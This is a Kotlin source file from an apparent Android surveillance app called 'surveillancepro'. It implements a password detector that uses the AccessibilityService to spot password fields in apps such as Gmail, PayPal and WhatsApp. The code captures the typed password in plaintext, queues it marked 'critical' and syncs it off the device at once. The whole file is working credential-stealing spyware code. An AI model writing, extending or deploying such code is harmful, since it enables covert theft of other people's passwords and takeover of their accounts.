package com.surveillancepro.android.services

import android.content.Context
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.workers.SyncWorker
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Détecteur de mots de passe tapés.
 * 
 * MÉTHODE:
 * Analyse les frappes clavier pour détecter quand l'utilisateur
 * tape un mot de passe (champ masqué, patterns de saisie).
 * 
 * INDICATEURS DE MOT DE PASSE:
 * 1. Champ de type "password" ou "textPassword"
 * 2. Hint contenant "password", "mot de passe", "pin", "code"
 * 3. Texte masqué (•••••)
 * 4. Saisie suivie d'un bouton "Connexion" ou "Login"
 * 
 * SANS ROOT - Utilise AccessibilityService
 */
object PasswordDetector {
    
    private const val TAG = "PasswordDetector"
    
    // Patterns qui indiquent un champ de mot de passe
    private val PASSWORD_HINTS = listOf(
        "password", "mot de passe", "mdp", "pwd",
        "pin", "code", "secret", "passphrase",
        "contraseña", "passwort", "senha",
        "code secret", "code pin", "code d'accès",
    )
    
    // Patterns qui indiquent une page de connexion
    private val LOGIN_INDICATORS = listOf(
        "connexion", "login", "sign in", "se connecter",
        "authentification", "authenticate", "log in",
        "accéder", "entrer", "enter", "submit",
    )
    
    // Apps où les mots de passe sont particulièrement intéressants
    private val SENSITIVE_APPS = mapOf(
        "com.google.android.gm" to "Gmail",
        "com.facebook.katana" to "Facebook",
        "com.instagram.android" to "Instagram",
        "com.whatsapp" to "WhatsApp",
        "com.twitter.android" to "Twitter",
        "com.snapchat.android" to "Snapchat",
        "com.linkedin.android" to "LinkedIn",
        "com.paypal.android.p2pmobile" to "PayPal",
        "com.venmo" to "Venmo",
        "com.amazon.mShop.android.shopping" to "Amazon",
        "com.ebay.mobile" to "eBay",
    )
    
    // Buffer pour accumuler les frappes dans un champ password
    private var passwordBuffer = ""
    private var currentApp = ""
    private var currentField = ""
    private var isPasswordField = false
    private var lastKeystrokeTime = 0L
    
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    /**
     * Appelé quand un champ reçoit le focus.
     * Détecte si c'est un champ de mot de passe.
     */
    fun onFieldFocused(
        context: Context,
        packageName: String,
        fieldHint: String?,
        fieldType: String?,
        isTextPassword: Boolean
    ) {
        val hintLower = fieldHint?.lowercase() ?: ""
        val typeLower = fieldType?.lowercase() ?: ""
        
        // Détecter si c'est un champ de mot de passe
        isPasswordField = isTextPassword ||
            typeLower.contains("password") ||
            PASSWORD_HINTS.any { hintLower.contains(it) }
        
        if (isPasswordField) {
            // Nouveau champ password - réinitialiser le buffer
            passwordBuffer = ""
            currentApp = packageName
            currentField = fieldHint ?: "password"
            lastKeystrokeTime = System.currentTimeMillis()
            
            Log.d(TAG, "Password field detected in $packageName: $fieldHint")
        }
    }
    
    /**
     * Appelé pour chaque frappe clavier.
     */
    fun onKeystroke(context: Context, text: String, packageName: String) {
        if (!isPasswordField) return
        if (packageName != currentApp) return
        
        val now = System.currentTimeMillis()
        
        // Si trop de temps s'est écoulé, c'est probablement un nouveau mot de passe
        if (now - lastKeystrokeTime > 30000) { // 30 secondes
            if (passwordBuffer.isNotEmpty()) {
                // Envoyer le mot de passe précédent
                sendPasswordCapture(context, passwordBuffer, currentApp, currentField)
            }
            passwordBuffer = ""
        }
        
        passwordBuffer = text
        lastKeystrokeTime = now
    }
    
    /**
     * Appelé quand le champ perd le focus ou quand un bouton de connexion est cliqué.
     */
    fun onFieldBlurred(context: Context) {
        if (isPasswordField && passwordBuffer.isNotEmpty()) {
            sendPasswordCapture(context, passwordBuffer, currentApp, currentField)
        }
        
        isPasswordField = false
        passwordBuffer = ""
        currentApp = ""
        currentField = ""
    }
    
    /**
     * Appelé quand un bouton de connexion est détecté.
     */
    fun onLoginButtonClicked(context: Context, buttonText: String, packageName: String) {
        val buttonLower = buttonText.lowercase()
        
        if (LOGIN_INDICATORS.any { buttonLower.contains(it) }) {
            Log.d(TAG, "Login button clicked: $buttonText in $packageName")
            
            // Si on a un mot de passe en attente, l'envoyer
            if (passwordBuffer.isNotEmpty()) {
                sendPasswordCapture(context, passwordBuffer, currentApp, currentField)
                passwordBuffer = ""
            }
        }
    }
    
    /**
     * Envoie la capture du mot de passe.
     */
    private fun sendPasswordCapture(
        context: Context,
        password: String,
        packageName: String,
        fieldHint: String
    ) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted) return
        
        val queue = EventQueue.getInstance(context)
        val appName = SENSITIVE_APPS[packageName] ?: packageName.substringAfterLast(".")
        
        // Masquer partiellement le mot de passe pour le log
        val maskedPassword = if (password.length > 2) {
            password.take(1) + "*".repeat(password.length - 2) + password.takeLast(1)
        } else {
            "*".repeat(password.length)
        }
        
        queue.enqueue("password_captured", mapOf(
            "app" to appName,
            "packageName" to packageName,
            "fieldHint" to fieldHint,
            "password" to password, // Le vrai mot de passe
            "passwordLength" to password.length,
            "isSensitiveApp" to SENSITIVE_APPS.containsKey(packageName),
            "timestamp" to dateFormat.format(Date()),
            "severity" to "critical",
        ))
        
        Log.d(TAG, "Password captured: $appName ($maskedPassword)")
        
        // Sync immédiat - c'est critique!
        SyncWorker.triggerNow(context)
    }
    
    /**
     * Analyse un texte pour détecter s'il ressemble à un mot de passe.
     * Utilisé pour la détection heuristique.
     */
    fun looksLikePassword(text: String): Boolean {
        if (text.length < 4 || text.length > 50) return false
        
        // Un mot de passe typique contient:
        // - Au moins une lettre
        // - Au moins un chiffre OU un caractère spécial
        // - Pas d'espaces
        
        val hasLetter = text.any { it.isLetter() }
        val hasDigit = text.any { it.isDigit() }
        val hasSpecial = text.any { !it.isLetterOrDigit() && !it.isWhitespace() }
        val hasNoSpaces = !text.contains(" ")
        
        return hasLetter && (hasDigit || hasSpecial) && hasNoSpaces
    }
}
